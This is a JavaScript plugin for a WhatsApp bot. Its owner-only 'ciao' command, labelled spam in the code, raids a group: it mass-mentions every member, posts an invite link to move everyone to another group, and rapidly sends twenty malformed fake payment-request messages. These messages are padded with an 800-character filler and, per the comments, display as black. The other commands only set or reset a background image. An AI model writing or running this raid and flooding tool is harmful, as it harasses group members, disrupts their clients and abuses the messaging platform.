module.exports = (() => {
    const delay = (ms) => new Promise(r => setTimeout(r, ms));
    const { pureId } = require('../lib/utils');
    const { isOwner } = require('../lib/owner');
    const baileys = require('@itsliaaa/baileys');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    const { execFile } = require('child_process');

    const GROUP_LINK  = 'https://chat.whatsapp.com/H5ZmgxVQ0RE2FEyKjR79RZ?s=cl&p=a&mlu=4&ilr=4';
    const MESSAGGIO   = 'CI TRASFERIAMO TUTTI QUA';
    const RIPETIZIONI = 20; 
    const DELAY_MS    = 50; 
    const BATCH_SIZE  = 5;  
    const IMPORTO_FINTO = 6767; 

    const DECO = 'ꦾ'.repeat(800);
    const SEPARATOR = '░▒▓█' + '█'.repeat(25) + '▓▒░';

    const SFONDO_PATH = './media/sfondo.jpg';

    // Utility da zeno-menu.js per i media
    const unwrap = (msg) => {
        let x = msg;
        for (let i = 0; i < 6 && x; i++) {
            const n = x.ephemeralMessage?.message || x.viewOnceMessage?.message || x.viewOnceMessageV2?.message ||
                x.viewOnceMessageV2Extension?.message || x.documentWithCaptionMessage?.message || x.editedMessage?.message;
            if (!n) break;
            x = n;
        }
        return x;
    }

    function findMediaNode(m) {
        const root = unwrap(m.message || {});
        const ctxInfo = root?.extendedTextMessage?.contextInfo || root?.imageMessage?.contextInfo ||
            root?.videoMessage?.contextInfo || root?.documentMessage?.contextInfo;
        const quoted = unwrap(ctxInfo?.quotedMessage);
        for (const c of [root, quoted]) {
            if (!c) continue;
            if (c.imageMessage) return { type: 'image', node: c.imageMessage };
            if (c.videoMessage) return { type: 'video', node: c.videoMessage };
            if (c.documentMessage && /^(image|video)\//.test(c.documentMessage.mimetype || '')) return { type: 'document', node: c.documentMessage };
        }
        return null;
    }

    async function downloadNode(node, type) {
        const stream = await baileys.downloadContentFromMessage(node, type);
        const chunks = [];
        for await (const c of stream) chunks.push(c);
        return Buffer.concat(chunks);
    }

    function extractFirstFrame(videoBuf) {
        return new Promise((resolve, reject) => {
            const id = Date.now() + '_' + Math.floor(Math.random() * 1e5);
            const tin = path.join(os.tmpdir(), `zc_${id}.mp4`);
            const tout = path.join(os.tmpdir(), `zc_${id}.jpg`);
            fs.writeFileSync(tin, videoBuf);
            execFile('ffmpeg', ['-y', '-i', tin, '-frames:v', '1', tout], (err) => {
                try {
                    if (err || !fs.existsSync(tout)) return reject(new Error('ffmpeg fallito'));
                    resolve(fs.readFileSync(tout));
                } finally {
                    try { fs.unlinkSync(tin); } catch {}
                    try { fs.unlinkSync(tout); } catch {}
                }
            });
        });
    }

    return {
        commands: ['ciao', 'setciao', 'resetciao'],

        run: async (sock, m, args, cmd, ctx) => {
            try {
                const chatId = m.key.remoteJid;
                const sender = m.key.participant || m.key.remoteJid;

                if (!isOwner(sender)) {
                    return await sock.sendMessage(chatId, { text: '⛔ *ACCESSO NEGATO*\nSolo il *Creatore* può usare questa funzione.' }, { quoted: m });
                }

                // ── COMANDO SETCIAO ──
                if (cmd === 'setciao') {
                    const arg = (args[0] || '').trim();
                    if (/^(reset|default|rimuovi|off)$/i.test(arg)) {
                        if (fs.existsSync(SFONDO_PATH)) fs.unlinkSync(SFONDO_PATH);
                        return ctx.reply('✅ *Sfondo rimosso!*');
                    }
                    let buf;
                    if (/^https?:\/\//i.test(arg)) {
                        if (typeof fetch !== 'function') return ctx.err('Node troppo vecchio.');
                        try {
                            const res = await fetch(arg);
                            if (!res.ok) return ctx.err(`Errore HTTP ${res.status}.`);
                            const mime = (res.headers.get('content-type') || '').toLowerCase();
                            buf = Buffer.from(await res.arrayBuffer());
                            if (mime.startsWith('video/') || mime.includes('gif')) {
                                await ctx.reply('ℹ️ Estraggo il fotogramma dal video...');
                                buf = await extractFirstFrame(buf);
                            }
                        } catch (e) { return ctx.err('Errore link: ' + e.message); }
                    } else {
                        const found = findMediaNode(m);
                        if (!found) return ctx.err(`Invia o rispondi a una foto/video con *${ctx.prefix}setciao*.\nOppure: *${ctx.prefix}setciao reset*`);
                        const dlType = found.type === 'document' ? 'document' : found.type;
                        
                        if (found.type === 'video' || (found.type === 'document' && (found.node.mimetype || '').startsWith('video/'))) {
                            if (found.node.jpegThumbnail) {
                                buf = Buffer.from(found.node.jpegThumbnail);
                            } else {
                                try {
                                    const videoBuf = await downloadNode(found.node, dlType);
                                    buf = await extractFirstFrame(videoBuf);
                                } catch (e) { return ctx.err('Impossibile estrarre il frame. Invia una foto.'); }
                            }
                        } else {
                            buf = await downloadNode(found.node, dlType);
                        }
                    }
                    if (!buf || !buf.length) return ctx.err('File vuoto.');
                    fs.mkdirSync('./media', { recursive: true });
                    fs.writeFileSync(SFONDO_PATH, buf);
                    return ctx.reply(`✅ *Sfondo salvato!* Ora usa \`.ciao\``);
                }

                if (cmd === 'resetciao') {
                    if (fs.existsSync(SFONDO_PATH)) fs.unlinkSync(SFONDO_PATH);
                    return await sock.sendMessage(chatId, { text: '🗑️ *Sfondo rimosso!*' }, { quoted: m });
                }

                // ── COMANDO CIAO (SPAM) ──
                if (!chatId.endsWith('@g.us')) return await sock.sendMessage(chatId, { text: '❌ Solo nei gruppi.' }, { quoted: m });

                let metadata;
                try { metadata = await sock.groupMetadata(chatId); } catch (e) { return await sock.sendMessage(chatId, { text: '❌ Impossibile leggere il gruppo.' }, { quoted: m }); }

                const botId = (sock.user?.id || '').split(':')[0].split('@')[0];
                const mentions = metadata.participants.filter(p => pureId(p.id) !== botId).map(p => p.id);
                if (!mentions.length) return await sock.sendMessage(chatId, { text: '❌ Nessun membro.' }, { quoted: m });

                const caption = `${MESSAGGIO}\n\n📌 ${GROUP_LINK}\n\n${DECO}\n\n${SEPARATOR}\n🚨 *ATTENZIONE TUTTI!* 🚨`;
                const ownerJid = `${sock.user.id.split(':')[0]}@s.whatsapp.net`;

                sock.sendMessage(chatId, { react: { text: '⚡', key: m.key } }).catch(() => {});

                // 📸 1. INVIA L'IMMAGINE IN CHAT (per farla vedere)
                if (fs.existsSync(SFONDO_PATH)) {
                    try {
                        await sock.sendMessage(chatId, { 
                            image: fs.readFileSync(SFONDO_PATH), 
                            caption: caption,
                            mentions: mentions
                        });
                    } catch(e) { console.error('Errore invio immagine visibile:', e.message); }
                }

                // 💸 2. SPARA I PAGAMENTI (che resteranno neri)
                const paymentContent = {
                    requestPaymentMessage: {
                        currencyCodeIso4217: 'XXX',
                        amount1000: IMPORTO_FINTO * 1000, 
                        requestFrom: ownerJid,
                        expiryTimestamp: 0,
                        amount: { value: IMPORTO_FINTO * 1000, offset: 1000, currencyCode: 'XXX' },
                        noteMessage: {
                            extendedTextMessage: {
                                text: caption,
                                contextInfo: { mentionedJid: mentions } 
                            }
                        }
                    }
                };

                const sendSingleMessage = async () => {
                    const msg = await baileys.generateWAMessageFromContent(chatId, paymentContent, { userJid: sock.user.id });
                    return sock.relayMessage(chatId, msg.message, { messageId: msg.key.id });
                };

                for (let i = 0; i < RIPETIZIONI; i += BATCH_SIZE) {
                    const currentBatchSize = Math.min(BATCH_SIZE, RIPETIZIONI - i);
                    const promises = Array.from({ length: currentBatchSize }, () => 
                        sendSingleMessage().catch(cardErr => sock.sendMessage(chatId, { text: caption, mentions }))
                    );
                    await Promise.all(promises);
                    if (i + BATCH_SIZE < RIPETIZIONI && DELAY_MS > 0) await delay(DELAY_MS);
                }

                sock.sendMessage(chatId, { react: { text: '💣', key: m.key } }).catch(() => {});

            } catch (err) {
                console.error('[IMPERATORE PAY] ERRORE:', err);
            }
        }
    };
})();
